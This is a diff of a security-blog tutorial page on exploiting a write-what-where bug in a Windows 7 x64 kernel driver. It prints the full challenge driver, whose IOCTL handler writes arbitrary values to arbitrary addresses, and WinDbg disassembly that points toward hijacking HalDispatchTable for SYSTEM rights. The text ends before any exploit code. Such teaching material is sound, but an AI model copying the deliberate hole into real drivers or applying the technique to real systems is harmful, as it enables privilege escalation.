@@ -1,170 +1,165 @@
 <!DOCTYPE html>
-<html lang="en-US">
+<html>
   <head>
-  <meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-
-  <title>Driver write-what-where vulnerability</title>
-  <meta name="description" content="In this article, we will exploit a write-what-where vulnerability in Windows 7 x64. To do that, we will use the last level of 0vercl0k: the level 3. We need ...">
-  <link rel="canonical" href="https://dimitrifourny.github.io/2014/03/16/driver-write-what-where.html">
-
-  <link rel="stylesheet" href="/assets/css/style.css">
-  <link rel="stylesheet" href="/assets/css/syntax-github.css">
-  <link rel="shortcut icon" href="/assets/img/favicon.png">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
-  <link href="https://fonts.googleapis.com/css2?family=Roboto&family=Source+Code+Pro&display=swap" rel="stylesheet">
-</head>
-
-
-  <bodys>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+    <title>
+  Driver write-what-where vulnerability &ndash; Dimitri Fourny
+</title>
+  
+    <meta name="description" content="Personal website and computer security blog.">
+    <link rel="canonical" href="https://dimitrifourny.github.io/">
+  
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/syntax-github.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" rel="stylesheet">
+  
+    <link rel="shortcut icon" href="/img/favicon.png">
     
-  <div id="navigation">
-    <nav id="primary-nav"><a href="/">Home</a><span> | </span><a href="/about">About</a><span> | </span><a href="https://github.com/DimitriFourny">Github</a><span> | </span><a href="https://twitter.com/DimitriFourny">Twitter</a><span> | </span><a href="https://infosec.exchange/@dimitrifourny">Mastodon</a><span> | </span><a href="https://www.linkedin.com/in/dimitrifourny/">Linkedin</a></nav>
-  </div>
-
-
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto&family=Source+Code+Pro&display=swap" rel="stylesheet">
+  </head>
+  <body>
     <header>
-  <div id="masthead">
-    <div id="site-title">Dimitri Fourny</div>
-    <div id="site-description">Personal website and computer security blog.</p>
-  </div>
-</header>
-
-
-    <main id="main" class="main-content" aria-label="Content">
-  <article class="h-entry">
-    <div class="page-wrapper">
-      <header class="page-header">
+      <div id="nav-header">
+        <div id="nav-logo">
+          <div id="site-title"><a href="/">Dimitri Fourny</a></div>
+          <div id="site-description">Personal website and computer security blog.</div>
+        </div>
         
-        <h1 id="page-title" class="page-title p-name">Driver write-what-where vulnerability
-</h1>
-      </header>
+        <nav>
+          <a href="/">Home</a>
+          <a href="/about.html">About</a>
+          <a href="https://github.com/DimitriFourny"><i class="fa-brands fa-github"></i></a>
+          <a href="https://infosec.exchange/@dimitrifourny"><i class="fa-brands fa-mastodon"></i></a>
+          <a href="https://twitter.com/DimitriFourny"><i class="fa-brands fa-twitter"></i></a>
+          <a href="https://www.linkedin.com/in/dimitrifourny/"><i class="fa-brands fa-linkedin"></i></a>
+        </nav>
+      </div>
+    </header>    
 
-      <div class="page-content">
-        <div class="e-content">
-          <p>In this article, we will exploit a write-what-where vulnerability in Windows 7 
-x64. To do that, we will use the last level of 
-<a href="https://twitter.com/0vercl0k">0vercl0k</a>: the level 3. We need to do some 
-changes to make a driver which work on a x64 system:</p>
-
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;Ntifs.h&gt;
-#include &lt;stdio.h&gt;
-#include &lt;string.h&gt;
-</span>
-<span class="cp">#define ERROR(_f_, _status_) DbgPrint("\r\n[!] Error at %s() : 0x%x\r\n", _f_, _status_)
-#define IOCTL_WRIT CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define DbgPrint(...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0x1337, __VA_ARGS__)
-</span>
-<span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">DWORD</span><span class="p">;</span>
-<span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">PBYTE</span><span class="p">;</span>
-<span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">BYTE</span><span class="p">;</span>
-
-<span class="c1">//</span>
-<span class="n">DRIVER_UNLOAD</span> <span class="n">Unload</span><span class="p">;</span>
-<span class="n">DRIVER_INITIALIZE</span> <span class="n">DriverEntry</span><span class="p">;</span>
-<span class="n">DRIVER_DISPATCH</span> <span class="n">handleIOCTLs</span><span class="p">;</span>
-<span class="n">DRIVER_DISPATCH</span> <span class="n">handleIRP</span><span class="p">;</span>
-<span class="c1">//</span>
-
-<span class="k">typedef</span> <span class="k">struct</span>
-<span class="p">{</span>
-    <span class="n">PDWORD64</span> <span class="n">where</span><span class="p">;</span>
-    <span class="n">DWORD64</span> <span class="n">what</span><span class="p">;</span>
-<span class="p">}</span> <span class="n">L33TNESS</span><span class="p">,</span>
-<span class="o">*</span><span class="n">PL33TNESS</span><span class="p">;</span>
-
-<span class="n">NTSTATUS</span> <span class="nf">DriverEntry</span><span class="p">(</span><span class="n">PDRIVER_OBJECT</span> <span class="n">pDriverObj</span> <span class="p">,</span> <span class="n">PUNICODE_STRING</span> <span class="n">pRegistryPath</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="n">DWORD</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-    <span class="n">NTSTATUS</span> <span class="n">status</span><span class="p">;</span>
-    <span class="n">UNICODE_STRING</span> <span class="n">deviceName</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">},</span> <span class="n">symlinkName</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
-    <span class="n">PDEVICE_OBJECT</span> <span class="n">pDevice</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
-
-    <span class="n">pDriverObj</span><span class="o">-&gt;</span><span class="n">DriverUnload</span> <span class="o">=</span> <span class="n">Unload</span><span class="p">;</span>
-    <span class="n">DbgPrint</span><span class="p">(</span><span class="s">"[ Loading.. ]</span><span class="se">\r\n</span><span class="s">"</span><span class="p">);</span>
-
-    <span class="n">RtlInitUnicodeString</span><span class="p">(</span><span class="o">&amp;</span><span class="n">deviceName</span><span class="p">,</span> <span class="s">L"</span><span class="se">\\</span><span class="s">Device</span><span class="se">\\</span><span class="s">3"</span><span class="p">);</span>
-    <span class="n">RtlInitUnicodeString</span><span class="p">(</span><span class="o">&amp;</span><span class="n">symlinkName</span><span class="p">,</span> <span class="s">L"</span><span class="se">\\</span><span class="s">DosDevices</span><span class="se">\\</span><span class="s">3"</span><span class="p">);</span>
-
-    <span class="n">DbgPrint</span><span class="p">(</span><span class="s">"[ Creating the device...]</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
-    <span class="n">IoCreateDevice</span><span class="p">(</span>
-        <span class="n">pDriverObj</span><span class="p">,</span>
-        <span class="mi">0</span><span class="p">,</span>
-        <span class="o">&amp;</span><span class="n">deviceName</span><span class="p">,</span>
-        <span class="n">FILE_DEVICE_UNKNOWN</span><span class="p">,</span>
-        <span class="n">FILE_DEVICE_SECURE_OPEN</span><span class="p">,</span>
-        <span class="n">FALSE</span><span class="p">,</span>
-        <span class="o">&amp;</span><span class="n">pDevice</span>
-    <span class="p">);</span>
-
-    <span class="n">DbgPrint</span><span class="p">(</span><span class="s">"[ Linking...]</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
-    <span class="n">IoCreateSymbolicLink</span><span class="p">(</span><span class="o">&amp;</span><span class="n">symlinkName</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">deviceName</span><span class="p">);</span>
-
-    <span class="k">for</span><span class="p">(;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">IRP_MJ_MAXIMUM_FUNCTION</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
-        <span class="n">pDriverObj</span><span class="o">-&gt;</span><span class="n">MajorFunction</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">handleIRP</span><span class="p">;</span>
-
-    <span class="n">pDriverObj</span><span class="o">-&gt;</span><span class="n">MajorFunction</span><span class="p">[</span><span class="n">IRP_MJ_DEVICE_CONTROL</span><span class="p">]</span> <span class="o">=</span> <span class="n">handleIOCTLs</span><span class="p">;</span>
-    <span class="k">return</span> <span class="n">STATUS_SUCCESS</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="n">NTSTATUS</span> <span class="nf">handleIRP</span><span class="p">(</span><span class="n">PDEVICE_OBJECT</span> <span class="n">pDeviceObject</span><span class="p">,</span> <span class="n">PIRP</span> <span class="n">Irp</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="k">return</span> <span class="n">STATUS_SUCCESS</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="n">NTSTATUS</span> <span class="nf">handleIOCTLs</span><span class="p">(</span><span class="n">PDEVICE_OBJECT</span> <span class="n">pDeviceObject</span><span class="p">,</span> <span class="n">PIRP</span> <span class="n">pIrp</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="n">PIO_STACK_LOCATION</span> <span class="n">pIoStackLocation</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
-    <span class="n">PL33TNESS</span> <span class="n">ptr</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
-    <span class="n">DWORD</span> <span class="n">ioControlCode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">inputBufferLength</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-    <span class="n">PVOID</span> <span class="n">inputBuffer</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-
-    <span class="n">pIoStackLocation</span> <span class="o">=</span> <span class="n">IoGetCurrentIrpStackLocation</span><span class="p">(</span><span class="n">pIrp</span><span class="p">);</span>
-    <span class="n">ioControlCode</span> <span class="o">=</span> <span class="n">pIoStackLocation</span><span class="o">-&gt;</span><span class="n">Parameters</span><span class="p">.</span><span class="n">DeviceIoControl</span><span class="p">.</span><span class="n">IoControlCode</span><span class="p">;</span>
-    <span class="n">inputBufferLength</span> <span class="o">=</span> <span class="n">pIoStackLocation</span><span class="o">-&gt;</span><span class="n">Parameters</span><span class="p">.</span><span class="n">DeviceIoControl</span><span class="p">.</span><span class="n">InputBufferLength</span><span class="p">;</span>
-    <span class="n">inputBuffer</span> <span class="o">=</span> <span class="n">pIrp</span><span class="o">-&gt;</span><span class="n">AssociatedIrp</span><span class="p">.</span><span class="n">SystemBuffer</span><span class="p">;</span>
-
-    <span class="k">switch</span><span class="p">(</span><span class="n">ioControlCode</span><span class="p">)</span>
-    <span class="p">{</span>
-        <span class="k">case</span> <span class="n">IOCTL_WRIT</span><span class="p">:</span>
-        <span class="p">{</span>
-            <span class="k">if</span><span class="p">(</span><span class="n">inputBufferLength</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">inputBufferLength</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span><span class="p">))</span>
-            <span class="p">{</span>
-                <span class="n">ptr</span> <span class="o">=</span> <span class="p">(</span><span class="n">PL33TNESS</span><span class="p">)</span><span class="n">inputBuffer</span><span class="p">;</span>
-
-                <span class="cm">/* DROP IT LIKE ITS HOT, DROP IT LIKE ITS HOT */</span>
-                <span class="o">*</span><span class="n">ptr</span><span class="o">-&gt;</span><span class="n">where</span> <span class="o">=</span> <span class="n">ptr</span><span class="o">-&gt;</span><span class="n">what</span><span class="p">;</span>
-            <span class="p">}</span>
-            <span class="k">else</span>
-                <span class="n">DbgPrint</span><span class="p">(</span><span class="s">"You must supply a buffer formated like that: [@address to write][value to be writed].</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
-
-            <span class="k">break</span><span class="p">;</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-
-    <span class="n">IoCompleteRequest</span><span class="p">(</span><span class="n">pIrp</span><span class="p">,</span> <span class="n">IO_NO_INCREMENT</span><span class="p">);</span>
-    <span class="k">return</span> <span class="n">pIrp</span><span class="o">-&gt;</span><span class="n">IoStatus</span><span class="p">.</span><span class="n">Status</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="n">VOID</span> <span class="nf">Unload</span><span class="p">(</span><span class="n">PDRIVER_OBJECT</span> <span class="n">pDrivObj</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="n">DbgPrint</span><span class="p">(</span><span class="s">"[ Unloading.. ]</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
-    <span class="k">return</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></div></div>
-
-<p>This time, we can see that we can write anything and where we want. But how to 
-execute a code with the SYSTEM right with that? <code class="highlighter-rouge">NtQueryIntervalProfile</code> will 
+    <div id="content">
+<section>
+  <article class="page-content">
+    <h1>Driver write-what-where vulnerability</h1>
+    <p>In this article, we will exploit a write-what-where vulnerability in Windows 7
+x64. To do that, we will use the last level of
+<a href="https://twitter.com/0vercl0k">0vercl0k</a>: the level 3.</p>
+<p>We need to do some changes to make a driver which work on a x64 system:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;Ntifs.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define ERROR(_f_, _status_) DbgPrint(&#34;\r\n[!] Error at %s() : 0x%x\r\n&#34;, _f_, _status_)
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define IOCTL_WRIT CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define DbgPrint(...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0x1337, __VA_ARGS__)
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">DWORD</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">PBYTE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">BYTE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">DRIVER_UNLOAD</span> <span class="n">Unload</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">DRIVER_INITIALIZE</span> <span class="n">DriverEntry</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">DRIVER_DISPATCH</span> <span class="n">handleIOCTLs</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">DRIVER_DISPATCH</span> <span class="n">handleIRP</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PDWORD64</span> <span class="n">where</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DWORD64</span> <span class="n">what</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">L33TNESS</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="o">*</span><span class="n">PL33TNESS</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">NTSTATUS</span> <span class="nf">DriverEntry</span><span class="p">(</span><span class="n">PDRIVER_OBJECT</span> <span class="n">pDriverObj</span> <span class="p">,</span> <span class="n">PUNICODE_STRING</span> <span class="n">pRegistryPath</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">NTSTATUS</span> <span class="n">status</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">UNICODE_STRING</span> <span class="n">deviceName</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">},</span> <span class="n">symlinkName</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PDEVICE_OBJECT</span> <span class="n">pDevice</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">pDriverObj</span><span class="o">-&gt;</span><span class="n">DriverUnload</span> <span class="o">=</span> <span class="n">Unload</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DbgPrint</span><span class="p">(</span><span class="s">&#34;[ Loading.. ]</span><span class="se">\r\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">RtlInitUnicodeString</span><span class="p">(</span><span class="o">&amp;</span><span class="n">deviceName</span><span class="p">,</span> <span class="sa">L</span><span class="s">&#34;</span><span class="se">\\</span><span class="s">Device</span><span class="se">\\</span><span class="s">3&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">RtlInitUnicodeString</span><span class="p">(</span><span class="o">&amp;</span><span class="n">symlinkName</span><span class="p">,</span> <span class="sa">L</span><span class="s">&#34;</span><span class="se">\\</span><span class="s">DosDevices</span><span class="se">\\</span><span class="s">3&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">DbgPrint</span><span class="p">(</span><span class="s">&#34;[ Creating the device...]</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">IoCreateDevice</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pDriverObj</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&amp;</span><span class="n">deviceName</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">FILE_DEVICE_UNKNOWN</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">FILE_DEVICE_SECURE_OPEN</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">FALSE</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&amp;</span><span class="n">pDevice</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">DbgPrint</span><span class="p">(</span><span class="s">&#34;[ Linking...]</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">IoCreateSymbolicLink</span><span class="p">(</span><span class="o">&amp;</span><span class="n">symlinkName</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">deviceName</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">IRP_MJ_MAXIMUM_FUNCTION</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pDriverObj</span><span class="o">-&gt;</span><span class="n">MajorFunction</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">handleIRP</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">pDriverObj</span><span class="o">-&gt;</span><span class="n">MajorFunction</span><span class="p">[</span><span class="n">IRP_MJ_DEVICE_CONTROL</span><span class="p">]</span> <span class="o">=</span> <span class="n">handleIOCTLs</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">STATUS_SUCCESS</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">NTSTATUS</span> <span class="nf">handleIRP</span><span class="p">(</span><span class="n">PDEVICE_OBJECT</span> <span class="n">pDeviceObject</span><span class="p">,</span> <span class="n">PIRP</span> <span class="n">Irp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">STATUS_SUCCESS</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">NTSTATUS</span> <span class="nf">handleIOCTLs</span><span class="p">(</span><span class="n">PDEVICE_OBJECT</span> <span class="n">pDeviceObject</span><span class="p">,</span> <span class="n">PIRP</span> <span class="n">pIrp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PIO_STACK_LOCATION</span> <span class="n">pIoStackLocation</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PL33TNESS</span> <span class="n">ptr</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">ioControlCode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">inputBufferLength</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">inputBuffer</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">pIoStackLocation</span> <span class="o">=</span> <span class="n">IoGetCurrentIrpStackLocation</span><span class="p">(</span><span class="n">pIrp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ioControlCode</span> <span class="o">=</span> <span class="n">pIoStackLocation</span><span class="o">-&gt;</span><span class="n">Parameters</span><span class="p">.</span><span class="n">DeviceIoControl</span><span class="p">.</span><span class="n">IoControlCode</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">inputBufferLength</span> <span class="o">=</span> <span class="n">pIoStackLocation</span><span class="o">-&gt;</span><span class="n">Parameters</span><span class="p">.</span><span class="n">DeviceIoControl</span><span class="p">.</span><span class="n">InputBufferLength</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">inputBuffer</span> <span class="o">=</span> <span class="n">pIrp</span><span class="o">-&gt;</span><span class="n">AssociatedIrp</span><span class="p">.</span><span class="n">SystemBuffer</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">switch</span><span class="p">(</span><span class="n">ioControlCode</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">IOCTL_WRIT</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="n">inputBufferLength</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">inputBufferLength</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">ptr</span> <span class="o">=</span> <span class="p">(</span><span class="n">PL33TNESS</span><span class="p">)</span><span class="n">inputBuffer</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="cm">/* DROP IT LIKE ITS HOT, DROP IT LIKE ITS HOT */</span>
+</span></span><span class="line"><span class="cl">                <span class="o">*</span><span class="n">ptr</span><span class="o">-&gt;</span><span class="n">where</span> <span class="o">=</span> <span class="n">ptr</span><span class="o">-&gt;</span><span class="n">what</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span>
+</span></span><span class="line"><span class="cl">                <span class="n">DbgPrint</span><span class="p">(</span><span class="s">&#34;You must supply a buffer formated like that: [@address to write][value to be writed].</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">IoCompleteRequest</span><span class="p">(</span><span class="n">pIrp</span><span class="p">,</span> <span class="n">IO_NO_INCREMENT</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">pIrp</span><span class="o">-&gt;</span><span class="n">IoStatus</span><span class="p">.</span><span class="n">Status</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">VOID</span> <span class="nf">Unload</span><span class="p">(</span><span class="n">PDRIVER_OBJECT</span> <span class="n">pDrivObj</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DbgPrint</span><span class="p">(</span><span class="s">&#34;[ Unloading.. ]</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>This time, we can see that we can write anything and where we want. But how to
+execute a code with the SYSTEM right with that? <code>NtQueryIntervalProfile</code> will
 help us.</p>
-
 <h2 id="haldispatchtable-is-our-friend">HalDispatchTable is our friend</h2>
-
 <p>Let’s see what this function do:</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kd&gt; u nt!NtQueryIntervalProfile
+<pre tabindex="0"><code>kd&gt; u nt!NtQueryIntervalProfile
 nt!NtQueryIntervalProfile:
 fffff800`029fff00 48895c2408      mov     qword ptr [rsp+8],rbx
 fffff800`029fff05 57              push    rdi
@@ -205,47 +200,42 @@ fffff800`029f09eb 8d4af5          lea     ecx,[rdx-0Bh]
 fffff800`029f09ee 4c8d442420      lea     r8,[rsp+20h]
 fffff800`029f09f3 ff156f52e0ff    call    qword ptr [nt!HalDispatchTable+0x8 (fffff800`027f5c68)]
 fffff800`029f09f9 85c0            test    eax,eax
-</code></pre></div></div>
-
-<p>We can see that if we call <code class="highlighter-rouge">NtQueryIntervalProfile</code> in ring3, Windows will call 
-<code class="highlighter-rouge">KeQueryIntervalProfile</code> in ring0 and the function pointed by 
-<code class="highlighter-rouge">nt!HalDispatchTable+0x8</code>! But what is <code class="highlighter-rouge">HalDispatchTable</code>? ReactOS will help us:</p>
-
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
-	<span class="n">ULONG</span> <span class="n">Version</span><span class="p">;</span>
-	<span class="n">pHalQuerySystemInformation</span> <span class="n">HalQuerySystemInformation</span><span class="p">;</span>
-	<span class="n">pHalSetSystemInformation</span> <span class="n">HalSetSystemInformation</span><span class="p">;</span>
-	<span class="n">pHalQueryBusSlots</span> <span class="n">HalQueryBusSlots</span><span class="p">;</span>
-	<span class="n">ULONG</span> <span class="n">Spare1</span><span class="p">;</span>
-	<span class="n">pHalExamineMBR</span> <span class="n">HalExamineMBR</span><span class="p">;</span>
-<span class="cp">#if 1 </span><span class="cm">/* Not present in WDK 7600 */</span><span class="cp">
-</span>	<span class="n">pHalIoAssignDriveLetters</span> <span class="n">HalIoAssignDriveLetters</span><span class="p">;</span>
-<span class="cp">#endif
-</span>	<span class="n">pHalIoReadPartitionTable</span> <span class="n">HalIoReadPartitionTable</span><span class="p">;</span>
-	<span class="n">pHalIoSetPartitionInformation</span> <span class="n">HalIoSetPartitionInformation</span><span class="p">;</span>
